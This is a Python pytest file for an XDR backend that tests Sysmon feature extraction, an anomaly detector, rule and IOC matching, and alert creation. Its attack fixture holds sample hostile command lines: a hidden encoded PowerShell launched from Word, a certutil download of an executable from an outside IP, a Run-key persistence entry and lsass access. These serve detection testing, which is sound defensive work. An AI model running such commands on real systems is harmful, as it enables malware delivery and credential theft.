import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

sys.path.insert(0, str(Path(__file__).parents[1] / "backend"))

from ai.datasets import to_server_event
from ai.detector import AnomalyDetector, save_model, train_model
from ai.features import FEATURE_NAMES, group_windows, window_features
from detection.ioc_engine import match_iocs
from detection.rule_engine import load_default_rules, match_event
from main import app

BENIGN_IMAGES = [
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "C:\\Windows\\System32\\conhost.exe",
    "C:\\Windows\\explorer.exe",
    "C:\\Program Files\\Microsoft VS Code\\Code.exe",
]


def edr_event(event_type: str, data: dict, host: str = "PC-01", ts: datetime | None = None) -> dict:
    return {
        "event_type": event_type,
        "source": "edr",
        "host_id": host,
        "timestamp": (ts or datetime(2026, 11, 1, 9, 0, tzinfo=timezone.utc)).isoformat(),
        "raw": {"source": "sysmon", "event_type": event_type, "data": data},
    }


def benign_window(rng: random.Random) -> list[dict]:
    events = []
    for _ in range(rng.randint(0, 6)):
        events.append(edr_event("process_create", {"Image": rng.choice(BENIGN_IMAGES),
                                                   "CommandLine": "app.exe --type=renderer",
                                                   "ParentImage": "C:\\Windows\\explorer.exe"}))
    for _ in range(rng.randint(0, 12)):
        events.append(edr_event("network_connect", {"DestinationIp": rng.choice(["10.0.0.5", "142.250.4.100", "20.190.1.10"]),
                                                    "DestinationPort": rng.choice(["443", "443", "80"])}))
    for _ in range(rng.randint(0, 8)):
        events.append(edr_event("dns_query", {"QueryName": rng.choice(["www.google.com", "login.microsoftonline.com", "github.com"])}))
    for _ in range(rng.randint(0, 5)):
        events.append(edr_event("file_create", {"TargetFilename": "C:\\Users\\a\\AppData\\Local\\Temp\\x.tmp"}))
    for _ in range(rng.randint(0, 3)):
        events.append(edr_event("registry_set", {"TargetObject": "HKCU\\Software\\App\\Settings"}))
    return events


def attack_events(host: str = "PC-01", ts: datetime | None = None) -> list[dict]:
    events = [
        edr_event("process_create", {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                     "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
                                     "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"}, host, ts),
        edr_event("process_create", {"Image": "C:\\Windows\\System32\\certutil.exe",
                                     "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.9/p.exe C:\\Users\\Public\\p.exe",
                                     "ParentImage": "C:\\Windows\\System32\\cmd.exe"}, host, ts),
        edr_event("process_create", {"Image": "C:\\Users\\Public\\p.exe", "CommandLine": "p.exe",
                                     "Hashes": "MD5=AAA,SHA256=DEADBEEF00"}, host, ts),
        edr_event("file_create", {"TargetFilename": "C:\\Users\\Public\\p.exe"}, host, ts),
        edr_event("registry_set", {"TargetObject": "HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd"}, host, ts),
        edr_event("process_access", {"TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1010"}, host, ts),
    ]
    for port in range(20, 60):
        events.append(edr_event("network_connect", {"DestinationIp": f"10.0.0.{port}", "DestinationPort": str(port)}, host, ts))
    return events


@pytest.fixture(scope="module")
def bundle() -> dict:
    rng = random.Random(7)
    return train_model([window_features(benign_window(rng)) for _ in range(400)], target_fpr=0.01)


def test_window_features_capture_attack_behaviour() -> None:
    features = window_features(attack_events())
    assert set(features) == set(FEATURE_NAMES)
    assert features["process_count"] == 3
    assert features["shell_process_count"] == 1
    assert features["lolbin_process_count"] == 1
    assert features["suspicious_cmdline_count"] == 2
    assert features["office_spawn_count"] == 1
    assert features["user_writable_exec_count"] == 1
    assert features["executable_file_create_count"] == 1
    assert features["persistence_registry_count"] == 1
    assert features["lsass_access_count"] == 1
    assert features["unique_dst_port"] == 40


def test_group_windows_splits_by_host_and_five_minutes() -> None:
    base = datetime(2026, 11, 1, 9, 0, tzinfo=timezone.utc)
    events = [edr_event("dns_query", {}, "A", base), edr_event("dns_query", {}, "A", base + timedelta(minutes=4)),
              edr_event("dns_query", {}, "A", base + timedelta(minutes=5)), edr_event("dns_query", {}, "B", base)]
    windows = group_windows(events)
    assert sorted((host, len(items)) for (host, _), items in windows.items()) == [("A", 1), ("A", 2), ("B", 1)]


def test_detector_flags_attack_and_explains_it(bundle: dict) -> None:
    detector = AnomalyDetector(bundle)
    rng = random.Random(99)
    benign_results = detector.score_many([window_features(benign_window(rng)) for _ in range(200)])
    attack_result = detector.score(window_features(attack_events()))

    assert attack_result["is_anomaly"]
    assert attack_result["ai_score"] >= 0.8
    assert attack_result["top_features"]
    assert sum(r["is_anomaly"] for r in benign_results) / len(benign_results) < 0.05


def test_dataset_conversion_matches_edr_agent_format() -> None:
    otrf = {"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "Hostname": "WS5",
            "@timestamp": "2020-12-19T07:50:03.060Z", "Image": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd /c whoami", "Message": "ignored"}
    event = to_server_event(otrf)
    assert event["event_type"] == "process_create" and event["host_id"] == "WS5"
    assert event["raw"]["data"]["Image"].endswith("cmd.exe") and "Message" not in event["raw"]["data"]

    export = {"Computer": "PC", "Channel": "Microsoft-Windows-Sysmon/Operational", "EventId": 22,
              "TimeCreated": "2026-11-05T08:47:52.0153635Z", "EventData": {"QueryName": "example.com"}}
    assert to_server_event(export)["event_type"] == "dns_query"

    # The EDR agent forwards Sysmon 10 only for lsass; offline data must follow the same filter.
    non_lsass = {**otrf, "EventID": 10, "TargetImage": "C:\\Windows\\explorer.exe"}
    assert to_server_event(non_lsass) is None
    assert to_server_event({**otrf, "Channel": "Security", "EventID": 4688}) is None


def test_rules_match_real_sysmon_events() -> None:
    rules = load_default_rules()
    matched = {rule["id"] for event in attack_events() for rule in match_event(event, rules)}
    assert {"edr-encoded-powershell", "edr-office-spawns-shell", "edr-certutil-download",
            "edr-run-key-persistence", "edr-lsass-access"} <= matched
    benign = edr_event("process_create", {"Image": BENIGN_IMAGES[1], "CommandLine": "chrome.exe"})
    assert match_event(benign, rules) == []


def test_ioc_matching_parses_sysmon_hashes_and_subdomains() -> None:
    iocs = {"ips": {"203.0.113.9"}, "domains": {"evil.test"}, "file_hashes": {"deadbeef00"}}
    hits = match_iocs(attack_events()[2], iocs)
    assert [hit["id"] for hit in hits] == ["ioc-hash"]
    dns = edr_event("dns_query", {"QueryName": "cdn.evil.test"})
    assert match_iocs(dns, iocs)[0]["name"] == "IOC match (domain): evil.test"


@pytest.fixture
def client(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, bundle: dict) -> TestClient:
    model_file = tmp_path / "model.joblib"
    save_model(bundle, model_file)
    monkeypatch.setenv("XDR_DATABASE_PATH", str(tmp_path / "xdr.sqlite3"))
    monkeypatch.setenv("XDR_AI_MODEL_PATH", str(model_file))
    monkeypatch.setenv("XDR_AI_ENABLED", "0")
    monkeypatch.setenv("XDR_AGENT_KEY", "test-agent-secret")
    monkeypatch.setenv("XDR_BOOTSTRAP_ADMIN_USERNAME", "admin")
    monkeypatch.setenv("XDR_BOOTSTRAP_ADMIN_PASSWORD", "test-admin-password")
    with TestClient(app) as test_client:
        login = test_client.post("/api/auth/login", json={"username": "admin", "password": "test-admin-password"})
        test_client.headers["Authorization"] = f"Bearer {login.json()['access_token']}"
        yield test_client


def test_end_to_end_ai_window_creates_alert_and_enriches_rule_alerts(client: TestClient) -> None:
    ts = datetime.now(timezone.utc) - timedelta(minutes=15)
    batch = []
    for index, event in enumerate(attack_events("victim-01", ts)):
        batch.append({**event["raw"], "computer": "victim-01", "record_id": str(index), "timestamp": event["timestamp"]})
    response = client.post("/api/events/batch", json=batch,
                           headers={"X-Agent-Id": "agent-01", "X-Agent-Key": "test-agent-secret"})
    assert response.json() == {"received": len(batch), "duplicates": 0}

    rule_alerts = client.get("/api/alerts").json()
    assert rule_alerts and all(alert["ai_score"] == 0.0 for alert in rule_alerts)
    risk_before = {alert["alert_id"]: alert["risk_score"] for alert in rule_alerts}

    status = client.get("/api/ai/status").json()
    assert status["enabled"] and status["features"] == FEATURE_NAMES
    assert set(status["feature_p99"]) == set(FEATURE_NAMES)  # used by the dashboard explanation

    result = client.post("/api/ai/analyze").json()
    assert result["analyzed"] == 1 and result["anomalies"] == 1
    assert client.post("/api/ai/analyze").json()["analyzed"] == 0  # windows are analysed once

    alerts = client.get("/api/alerts").json()
    ai_alerts = [alert for alert in alerts if alert["rule_id"] == "ai-anomaly"]
    assert len(ai_alerts) == 1 and ai_alerts[0]["title"].startswith("AI: anomalous behaviour on victim-01")
    for alert in alerts:
        if alert["alert_id"] in risk_before:
            assert alert["ai_score"] > 0.5
            assert alert["risk_score"] >= risk_before[alert["alert_id"]]

    windows = client.get("/api/ai/windows", params={"anomalies_only": True}).json()
    assert windows[0]["host_id"] == "victim-01" and windows[0]["alert_id"] == ai_alerts[0]["alert_id"]
    incident_ids = {alert["incident_id"] for alert in alerts}
    assert len(incident_ids) == 1  # rule and AI alerts land in the same host incident


def test_analyze_without_model_reports_status(client: TestClient, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setenv("XDR_AI_MODEL_PATH", str(tmp_path / "missing.joblib"))
    assert client.post("/api/ai/analyze").json()["status"] == "model_not_trained"
    assert client.get("/api/ai/status").json()["enabled"] is False
